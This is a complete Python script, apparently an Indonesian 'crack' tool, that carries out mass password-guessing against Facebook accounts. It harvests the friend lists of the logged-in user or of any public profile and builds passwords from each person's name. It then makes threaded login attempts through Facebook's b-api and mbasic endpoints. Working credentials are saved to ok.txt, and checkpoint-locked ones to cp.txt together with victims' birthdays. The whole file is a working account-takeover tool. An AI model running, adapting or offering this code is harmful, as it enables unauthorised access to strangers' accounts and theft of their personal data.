#!/usr/bin/python3
#-*-coding:utf-8-*-


import requests,bs4,sys,os,random,time,re,json
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime


host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]

try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()

op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))


def lang(cookies):
    f=False
    rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
    for i in rr.find_all("a",href=True):
        if "id_ID" in i.get("href"):
            requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
            b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text    
            if "apa yang anda pikirkan sekarang" in b.lower():
                f=True
    if f==True:
        return True
    else:
        exit("\nCookie Salah")
def basecookie():
    if os.path.exists(".cok"):
        if os.path.getsize(".cok") !=0:
            return gets_dict_cookies(open('.cok').read().strip())
        else:menu_log()
    else:menu_log()
def hdcok():
    global host
    hosts=host
    r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
    return r
def gets_cookies(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    return "".join(result)
def gets_dict_cookies(cookies):
    result={}
    try:
        for i in cookies.split(";"):
            result.update({i.split("=")[0]:i.split("=")[1]})
        return result
    except:
        for i in cookies.split("; "):
            result.update({i.split("=")[0]:i.split("=")[1]})
        return result

def banner():
    print("""     \033[0;92m████████╗███████╗░█████╗░███╗░░░███╗
     ╚══██╔══╝██╔════╝██╔══██╗████╗░████║
     ░░░██║░░░█████╗░░███████║██╔████╔██║
     ░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
     ░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
     ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝

\033[0;93m██████╗░███████╗███╗░░██╗░██████╗░███████╗██╗░░██╗
██╔══██╗██╔════╝████╗░██║██╔════╝░██╔════╝██║░██╔╝
██████╦╝█████╗░░██╔██╗██║██║░░██╗░█████╗░░█████═╝░
██╔══██╗██╔══╝░░██║╚████║██║░░╚██╗██╔══╝░░██╔═██╗░
██████╦╝███████╗██║░╚███║╚██████╔╝███████╗██║░╚██╗
╚═════╝░╚══════╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝\033[0m\n""")

def menu_log():
    os.system('rm -rf token.txt')
    os.system('clear')
    banner()
    print('[ 01 ] Login Token')
    print('[ 02 ] Login Cookies')
    print('[ 00 ] Keluar')
    pmu = input('\nPilih - ')
    if pmu in ['']:
        print('\nIsi Yang Benar')
        menu_log()
    elif pmu in ['1','01']:
        defaultua()
        token = input('\nToken - ')
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            print
            print('\nBerhasil Masuk')
            time.sleep(1)
            menu()
        except (KeyError,IOError):
            print
            print('Token Invalid')
            time.sleep(1)
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            print
            print('Koneksi Bermasalah')
            os.system('rm -rf token.txt')
            menu_log()
            
    elif pmu in ['2','02']:
        defaultua()
        cookie = input('\nCookies - ')
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            print
            print('Login Berhasil')
            time.sleep(1)
            menu()
        except requests.exceptions.ConnectionError:
            print
            print('\nKoneksi Bermasalah')
            time.sleep(1)
            os.system('rm -rf token.txt')
            menu_log()
        except (KeyError,IOError):
            print
            print('Cookies Invalid')
            os.system('rm -rf token.txt')
            time.sleep(1)
            menu_log()
            
    elif pmu in ['0','00']:
        print('Terima Kasih Telah Menggunakan SC Ini')
        print('Semoga Harimu Menyenangkan :)')
        time.sleep(1)
        os.system('rm -rf token.txt')
        exit()
    else:
        print('Isi Yang Benar')
        time.sleep(1)
        menu_log()

def menu():
    os.system('clear')
    banner()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        print('\nToken/Cookies Invalid')
        time.sleep(1)
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('Koneksi Bermasalah')
        time.sleep(1)
        os.system('rm -rf token.txt')
        menu_log()
    
    print('Haii - '+n)
    print('')
    print('[ 01 ] Crack Teman\n[ 02 ] Crack Publik\n[ 03 ] User Agent\n[ 04.] Deteksi Hasil Check\n[ 00 ] Keluar')
    pm = input('\nPilih - ')
    if pm in ['']:
        print('\nIsi Yang Benar')
        time.sleep(1)
        menu()
    elif pm in ['1','01']:
    	teman()
    elif pm in ['2','02']:
        publik()
    elif pm in ['3','03']:
        ugen()
    elif pm in ['4','04']:
        os.system("python deteksi.py")
    elif pm in ['0','00']:
        print('\nSampai Jumpa')
        time.sleep(1)
        os.system('rm -rf token.txt')
        menu_log()
    else:
        print('\nIsi Yang Benar')
        time.sleep(1)
        menu()

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()

def ugen():
    print("\n[ 01 ] Ganti User Agent")
    print("[ 02 ] User Agent Saat Ini")
    print("[ 00 ] Kembali")
    pmu = input('\nPilih - ')
    if pmu in[""]:
        print('\nSalah')
        time.sleep(1)
        ugen()
        
    elif pmu in ['1','01']:
        os.system("rm -rf ugent.txt")
        ua = input("\nUser Agent Baru - ")
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            print("\nBerhasil Mengganti User Agent")
            input('\nTekan Enter Untuk Kembali')
            menu()
        except (KeyError,IOError):
            print("\nGagal Mengganti User Agent")
            input('\nTekan Enter Untuk Kembali')
            menu()
            
    elif pmu in ['2','02']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Tidak Ditemukan'
        print("\nUser Agent Saat Ini - %s"%ungser)
        input('\nTekan Enter Untuk Kembali')
        menu()
    elif pmu in ['0','00']:
        menu()
    else:
        jalan('\nMelek Lah')
        exit()

def teman():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        print('\nToken/Cookies Invalid')
        os.system('rm -rf token.txt')
        time.sleep(1)
        menu_log()
    except requests.exceptions.ConnectionError:
        print('Koneksi Bermasalah')
        os.system('rm -rf token.txt')
        time.sleep(1)
        menu_log()
    try:
        
        try:
            pb = requests.get("https://graph.facebook.com/me?access_token=" + token)
            ob = json.loads(pb.text)
            print ('')
        except (KeyError,IOError):
            print('\nTeman Tidak Ada')
            time.sleep(1)
            menu()
        r = requests.get("https://graph.facebook.com/me/friends?limit=5000&access_token=" + token)
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('ID Yang Di Dapat - %s'%(len(id)))
        return crack(xc)
    except Exception as e:
        exit('Error %s'%e)
        
def publik():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        print('\nToken/Cookies Invalid')
        os.system('rm -rf token.txt')
        time.sleep(1)
        menu_log()
    except requests.exceptions.ConnectionError:
        print('Koneksi Bermasalah')
        os.system('rm -rf token.txt')
        time.sleep(1)
        menu_log()
    try:
        it = input("\nID Publik - ")
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('Nama - ' + ob['name'])
        except (KeyError,IOError):
            print('\nID Tidak Ditemukan')
            time.sleep(1)
            menu()
        r = requests.get("https://graph.facebook.com/" + it + "/friends?limit=5000&access_token=" + token)
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('ID Yang Di Dapat - %s'%(len(id)))
        return crack(xc)
    except Exception as e:
        exit('Error %s'%e)


def generate(text):
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
				results.append(i)
				
	return results

def log_api(em,pas,hosts):
    ua = open('ugent.txt', 'r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}

def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt', 'r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}

def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("Kelebihan Beban")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n"+str(opt+1)+" "+ngew[opt]+"      ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass

class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('\nIngin Menggunakan Sandi Manual.? [ y/t ]')
        while True:
            f = input('\nPilih - ')
            
            if f=="":
                print('\nIsi Yang Benar')
                time.slsep(1)
                menu()
                
            elif f in ['y','Y']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('\n[ CONTOH SANDI ] sayang,anjing,bangsat DLL')
                self.pwlist()
                break

            elif f in ['t','T']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":generate(i.split("•")[1])})
                        except:continue
                    print('\n\t        PILIH METODE CRACK')
                    print('\n[ 01 ] Metode b-api [ Crack Cepat ]')
                    print('[ 02 ] Metode mbasic [ Crack Lambat ] ')
                    
                    put = input('\nPilih - ')
                    if put in ['']:
                        print('\nIsi Yang Benar')
                        time.sleep(1)
                        menu()
                        
                    elif put in ['1','01']:
                        print('\nMunculkan Opsi CHECK.? [ y/t ]')
                        
                        puf = input('\nPilih - ')
                        if puf in ['']:
                            print('Isi Yang Benar')
                            menu()
                            
                        elif puf in ['y','Y']:
                            print('\nHasil RESULTS Tersimpan Di - ok.txt')
                            print('Hasil CHECK Tersimpan Di - cp.txt')
                            print('')
                            print('')
                            ThreadPool(30).map(self.api_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            
                            break
                        elif puf in ['t','T']:
                            print('\nHasil RESULTS Tersimpan Di - ok.txt')
                            print('Hasil CHECK Tersimpan Di - cp.txt')
                            print('')
                            print('')
                            ThreadPool(30).map(self.api,self.fl)
                            os.remove(self.apk)
                            exit()
                            
                            break
                        else:
                            print('\nIsi Yang Benar')
                            menu()
                            
                    elif put in ['2','02']:
                        print('\nMunculkan Opsi CP.? [ y/t ]')
                        puf = input('\nPilih - ')
                        if puf in ['']:
                            print('\nIsi Yang Benar')
                            time.sleep(1)
                            menu()
                            
                        elif puf in ['y','Y']:
                            print('\nHasil RESULTS Tersimpan Di - ok.txt')
                            print('Hasil CHECK Tersimpan Di - cp.txt')
                            print('\n\t         SEMOGA BERUNTUNG')
                            print('')
                            ThreadPool(20).map(self.mbasic_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break

                        elif puf in ['t','T']:
                            print('\nHasil RESULTS Tersimpan Di - ok.txt')
                            print('Hasil CHECK Tersimpan Di - cp.txt')
                            print('Pilih -')
                            print('')
                            ThreadPool(20).map(self.mbasic,self.fl)
                            os.remove(self.apk)
                            exit()
                            
                            break
                        else:
                            print('\nIsi Yang Benar')
                            time.sleep(1)
                            menu()

                    else:
                        print('\nIsi Yang Benar')
                        time.sleep(1)
                        menu()
                        
                except Exception as e:
                    print(("   %s"%e))
                    
    def pwlist(self):
        self.pw = input('\nSandi - ').split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            print('\n\t        PILIH METODE CRACK')
            print('\n[ 01 ] Metode b-api [ Crack Cepat ]')
            print('[ 02 ] Metode mbasic [ Crack Lambat ] ')
            put = input('\nPilih - ')
            
            if put in ['']:
                print('\nIsi Yang Benar')
                time.sleep(1)
                menu()
                
            elif put in ['1','01']:
                print('\nMunculkan Opsi CP.? [ y/t ]')
                puf = input('\nPilih - ')
                if puf in ['']:
                    print('Isi Yang Benar')
                    time.sleep(1)
                    menu()
                    
                elif puf in ['y','Y']:
                    print('\nHasil RESULTS Tersimpan Di - ok.txt')
                    print('Hasil CHECK Tersimpan Di - cp.txt')
                    print('')
                    print('')
                    ThreadPool(30).map(self.api_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                    
                elif puf in ['t','T']:
                    print('\nHasil RESULTS Tersimpan Di - ok.txt')
                    print('Hasil CHECK Tersimpan Di - cp.txt')
                    print('')
                    print('')
                    ThreadPool(30).map(self.api,self.fl)
                    os.remove(self.apk)
                    exit()
                    
                else:
                    print('\nIsi Yang Benar')
                    time.sleep(1)
                    menu()
                    
            elif put in ['2','02']:
                print('\nMunculkan Opsi CP.? [ y/t ]')
                puf = input('\nPilih - ')
                
                if puf in ['']:
                    print('\nIsi Yang Benar')
                    time.sleep(1)
                    menu()
                    
                elif puf in ['y','Y']:
                    print('\nHasil RESULTS Tersimpan Di - ok.txt')
                    print('Hasil CHECK Tersimpan Di - cp.txt')
                    print('')
                    print('')
                    ThreadPool(25).map(self.mbasic_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                    
                elif puf in ['t','T']:
                    print('\nHasil RESULTS Tersimpan Di - ok.txt')
                    print('Hasil CHECK Tersimpan Di - cp.txt')
                    print('')
                    print('')
                    ThreadPool(25).map(self.mbasic,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    print('\nIsi Yang Benar')
                    time.sleep(1)
                    menu()
                
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    print("\r\033[0;93mCP %s - %s               "%(fl.get("id"),i))
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("cp.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r\033[0;92mOK %s - %s               "%(fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("ok.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mOK [ %s ] \033[0;93mCP [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.api(fl)
            
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    h_cp = "\r\033[0;93mCP %s - %s               "%(fl.get("id"),i)
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("cp.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r\033[0;92mOK %s - %s               "%(fl.get("id"),i))
                    print("")
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("ok.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mOK [ %s ] \033[0;93mCP [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.api_opsi(fl)
            
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r\033[0;93mCP %s - %s %s %s %s   "%(fl.get("id"),i,d,m,y))
                        self.cp.append("%s - %s %s %s %s"%(fl.get("id"),i,d,m,y))
                        open("cp.txt","a+").write("%s - %s %s %s %s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r\033[0;93mCP %s - %s               "%(fl.get("id"),i))
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("cp.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r\033[0;92mOK %s - %s               "%(fl.get("id"),i))
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("ok.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mOK [ %s ] \033[0;93mCP [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.mbasic(fl)
            
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r\033[0;93mCP %s - %s - %s %s %s   "%(fl.get("id"),i,d,m,y)
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s - %s %s %s %s"%(fl.get("id"),i,d,m,y))
                        open("cp.txt","a+").write("%s - %s %s %s %s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r\033[0;93mCP %s - %s               "%(fl.get("id"),i)
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("cp.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r\033[0;92mOK %s - %s               "%(fl.get("id"),i))
                    print("")
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("ok.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mOK [ %s ] \033[0;93mCP [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)

def mencoba():
	try:
		token=open("token.txt","r").read()
		x = requests.get("https://graph.facebook.com/me?access_token=" + token)
		print("\nSelamat Datang Kembali ")
		time.sleep(2)
		menu()
	except FileNotFoundError:
		print("\nKamu Belum Login")
		time.sleep(2)
		menu_log()
	except KeyError:
		os.system("rm -rf token.txt")
		exit("\nToken/Cookie Invalid")

if __name__=='__main__':
  mencoba()